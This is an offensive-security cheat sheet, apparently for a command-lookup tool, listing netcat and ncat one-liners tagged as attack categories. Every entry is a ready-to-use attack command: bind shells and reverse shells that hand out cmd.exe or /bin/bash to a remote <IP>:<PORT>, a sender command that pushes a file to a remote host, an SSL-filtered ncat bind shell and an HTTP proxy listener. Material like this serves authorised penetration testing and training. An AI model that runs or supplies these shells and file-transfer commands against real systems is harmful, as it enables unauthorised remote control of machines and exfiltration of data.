# netcat

% nc, netcat

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
## nc setup listener
```
nc -nlvp <LPORT>
```

## nc bind shell windows
#plateform/windows 
```
nc -nlvp <PORT> -e cmd.exe
```

## nc bind shell linux
#plateform/linux
```
nc -nlvp <PORT> -e /bin/bash
```

## nc reverse shell windows
#plateform/windows  #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <IP> <PORT> -e cmd.exe
```

## nc reverse shell linux
#plateform/linux #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <IP> <PORT> -e /bin/bash
```

## nc transfer file - receiver
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <PORT> > <incomming_file>
```

## nc transfer file - sender
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <IP> <PORT> < <FILE>
```

# ncat

% ncat

## ncat bind shell ssl filtered
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --exec cmd.exe --allow <IP> -vnl <PORT> --ssl
```

## ncat bind shell ssl connection
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat -v <IP> <PORT> --ssl
```

## ncat HTTP WEB proxy
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --listen --proxy-type http <PORT>
```

